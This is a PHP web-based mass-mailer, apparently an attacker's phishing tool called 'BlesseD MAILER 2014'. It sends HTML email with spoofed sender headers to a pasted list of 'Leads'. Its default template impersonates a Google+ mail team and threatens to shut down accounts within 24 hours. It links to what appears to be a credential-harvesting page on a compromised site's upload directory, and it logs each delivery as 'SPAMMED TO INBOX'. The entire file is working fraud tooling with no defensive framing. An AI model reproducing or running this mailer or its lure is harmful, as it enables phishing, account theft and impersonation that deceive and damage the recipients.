<?php
mb_http_input("iso-8859-1");
mb_http_output("iso-8859-1");
?>
<?php
@set_time_limit(0);
if(isset($_POST['send']))
{
	$message = $_POST['html'];
	$subject = $_POST['ursubject'];
	$uremail = $_POST['uremail'];
	$urname = $_POST['realname'];
	$email = $_POST['email'];

	$message = urlencode($message);
	$message = ereg_replace("%5C%22", "%22", $message);
	$message = urldecode($message);
	$message = stripslashes($message);

}else{
	$testa ="";
	$message = "<html><body><font color='red'></font></body></html>";
	$subject = "E-mail Spam and Fraudulent Survey";
	$urname = "Google+ All Domain Mail Team";
	$uremail = "postmaster@googleplus";
	$email = "kennethlexxx_2010@yahoo.com";
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html">
<link rel="SHORTCUT ICON" href="http://www.smt.org//images/favicon.ico">
<title>BlesseD MAILER 2014&trade;</title>
<style type="text/css">
<!--
.form {font-family: "Courier New", Courier, monospace;border:none, background-color:#000000;}
.send {font-family: "Courier New", Courier, monospace;border:none; font-size:18px; background-color:#FFFFFF; font-black:bold}
#Layer1 {	position:absolute;
	left:203px;
	top:109px;
	width:829px;
	height:483px;
	z-index:1;
	margin-top: 0.5%;
	margin-right: 5%;
	right: 20%;
	bottom: 200%;
	margin-bottom: 10%;
	margin-left: 5%;
	border: thin solid #000;
}

-->
</style>
</head>

<body>
<form action="" method="post" name="codered">
<div align="center" id="Layer1">
  <table width="87%" height="77%" border="0" cellspacing="10">
    <tbody><tr>
      <td height="23" colspan="2"><div align="center" class="form">B L E S S E D S I N N E R </div></td>
    </tr>
    <tr>
      <td width="53%" height="24"><div align="center">
        <input name="uremail" type="text" class="form" id="uremail" size="30" value="<? print $uremail; ?>" placeholder="postmaster@googleplus">
      </div></td>
      <td width="47%"><div align="center">
        <input name="realname" type="text" class="form" id="realname" size="30" value="<? print $urname; ?>" placeholder="Google+  Mail Team">
      </div></td>
    </tr>
    <tr>
      <td height="34" colspan="2"><div align="center">
        <input name="ursubject" type="text" class="form" id="ursubject" size="83%" value="<? print $subject; ?>" placeholder="E-mail Spam  Survey">
      </div>
	  </td>
    </tr>
    <tr>
      <td height="165"><textarea name="html" class="form" cols="40" rows="10" placeholder="<title></title>
<style type="text/css">
<!--
.style2 {font-family: "Courier New", Courier, monospace}
.style4 {color: #330066; font-weight: bold; font-size: 20px; font-family: "Courier New", Courier, monospace; }
.style8 {font-size: 13px}
.style9 {
	color: #2672ec;
	font-weight: bold;
}
body {
	background-color: #E8E8E8;
	border-bottom-color: #E8E8E8;
	border-color: #E8E8E8;
	border-left-color: #E8E8E8;
	border-right-color: #E8E8E8;
	border-top-color: #E8E8E8;
	color: #CCCCCC;
	outline-color: #E8E8E8;
}
body,td,th {
	font-family: Courier New, Courier, monospace;
}
.style10 {color: #E8E8E8}
-->
</style>
<meta content="text/html; charset=iso-8859-1" http-equiv="Content-Type" />
<table width="100%" height="539" bordercolor="#E1E1E1" bgcolor="#E8E8E8" align="center" cellspacing="0" style="border:thin; border-style:solid">
    <tbody>
        <tr>
            <td bgcolor="#E8E8E8">
            <table width="397" height="423" bgcolor="#FFFFFF" align="center" cellspacing="10" style="border:thin; border-style:solid">
                <tbody>
                    <tr>
                        <td width="371" height="26" style="padding:0;font-family:" class="style10"><img width="391" height="23" alt="google+ logo" src="http://ssl.gstatic.com/accounts/ui/logo_strip_2x.png" /></td>
                    </tr>
                    <tr valign="top" align="left">
                        <td height="112" style="padding:0;padding-top:14px;font-family:'Segoe UI';font-size:12px;color:#2a2a2a;">
                        <p class="style2"> Dear &amp;email&amp;, <br />
                        <br />
                        Sorry you are seeing this.     <br />
                        We are doing a spam and fraudulent verification survey.<br />
                        <br />
                        Please its very important you participate in this survey to help us serve you better.<br />
                        <br />
                        </p>
                        </td>
                    </tr>
                    <tr bgcolor="#2672ec" align="left">
                        <td height="20" bgcolor="#2672ec" style="background-color:#2672ec;padding-top:2px;padding-right:20px;padding-bottom:5px;padding-left:20px;min-width:10px;"> <a style="font-family:'Segoe UI Semibold', 'Segoe UI Bold', 'Segoe UI', 'Helvetica Neue Medium', Arial, sans-serif;font-size:12px;text-align:center;text-decoration:none;font-weight:300;letter-spacing:0.02em;color:#fff;" href="http://sirajpress.com/ckeditor/kcfinder/upload/files/G/newpage/index.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=&email&&.rand=13vqcr8bp0gud&lc=1033&id=64855&mkt=en-us&cbcxt=mai&snsc=1"> Click here to help you perform this verification survey.</a></td>
                    </tr>
                    <tr>
                        <td height="25" style="padding:0;padding-top:2px;font-family:'Segoe UI';font-size:12px;color:#2a2a2a;"><span class="style2">The achievement of this survey is to track and shut down fraudulent user and phising domain to help improve and make your mailing system better. <br />
                        <br />
                        Please If a verification response is not gotten from you in the next 24 Hours, we will assume you are a fraulent user and shut down your mail account, till after proper verification recovery before you can access you mail account again. <br />
                        <br />
                        Thanks.<br />
                        <span class="style4 style2"><span class="style8">All Domain 2014 Team. </span></span></span></td>
                    </tr>
                    <tr>
                        <td>
                        <div align="center" class="style2">powered by: <span class="style9">Google+</span></div>
                        </td>
                    </tr>
                </tbody>
            </table>
            </td>
        </tr>
    </tbody>
</table>" ><? print $message; ?></textarea></td>
      <td>
	  <div align="right">
        <textarea class="form" rows="10" placeholder="Leads" name="email" cols="35"><? print $email; ?></textarea>
      </div></td></tr>
  </tbody>
  </table>
  <div><input type="submit" class="send" name="send" value="Start Sending">
  </div><DIV class="send"><?php
if(!isset($_POST['send'])){
	exit;
}

if(!isset($_GET['c']))
{
	$email = explode("\n", $email);
}else{
	$email = explode(",", $email);
}
$son = count($email);

if(!isset($_GET['e'])){
	$header = "MIME-Version: 1.0\n";
	$header .= "Content-type: text/html; charset=iso-8859-1\n";
	$header .= "From: ".$urname . " <" . $uremail . ">\n";
	$header .= "Reply-To: " . $uremail . "\n";
	$header .= "X-Priority: 3\n";
	$header .= "X-MSMail-Priority: Normal\n";
	$header .= "X-Mailer: ".$_SERVER["HTTP_HOST"];
}else{
	$header ='MIME-Version: 1.0' . "\r\n";
	$header .= 'Content-type: text/html' . "\r\n";
	$header .="From: ".$uremail;
}
$i = 0;
$voy=1;
while($email[$i])
{
	if(isset($_GET['time']) && isset($_GET['cant'])){
		if(fmod($i,$_GET['cant'])==0 && $i>0){
			print "----------------------------------> wait ".$_GET['time']." Segs. Sending to ".$_GET['notf']."...<br>\n";
			flush();
			@mail($_GET['notf'], $subject, $message, $header);
			sleep($_GET['time']);
		}
	}
	$mail = str_replace(array("\n","\r\n"),'',$email[$i]);
        $message1 = ereg_replace("&email&", $mail, $message);
	if(@mail($mail, $subject, $message1, $header))
	{
		print "<font color=blue face=verdana size=1>    ".$voy." OF ".$son."  ;-) ".trim($mail)."  SPAMMED TO INBOX</font><br>\n";
		flush();
	}
	else
	{
		print "<font color=red face=verdana size=1>    ".$voy." OF ".$son.":-( ".trim($mail)."  OOOPSS!!! SOMETHING IS WRONG</font><br>\n";
		flush();
	}                                                             
	$i++;
	$voy++;
}

?></DIV>
</div>
</form>